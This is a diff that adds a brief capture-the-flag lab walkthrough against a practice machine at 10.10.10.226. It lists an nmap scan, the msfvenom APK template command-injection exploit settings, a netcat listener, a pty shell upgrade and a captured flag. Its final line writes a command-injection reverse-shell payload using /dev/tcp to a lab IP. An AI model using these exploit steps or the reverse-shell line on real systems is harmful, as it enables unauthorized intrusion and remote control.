@@ -1,0 +1,26 @@
+Scan the port using: nmap -A -T4 10.10.10.226 // It will tell you the OS on
+which server is uploaded.
+Now go to the website with open port and upload the android malicious
+payload template made using: Rapid7 Metasploit Framework msfvenom APK 
+Template Command Injection 
+
+set your lhost to tun0 ip
+set your lport to 5555
+set your rhost to 10.10.10.226
+set your rport to 5000
+
+listen for the port in your local system using: nc -lvp 5555
+
+whoami // To know the user
+Changing it into interactive shell using python module
+Command used: 
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+Flag Captured: 9b30fd3b32879f62fe81bb06f02c58b0
+
+
+
+echo " ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.35/1234 0>&1' #" >> hackers
+
+
+
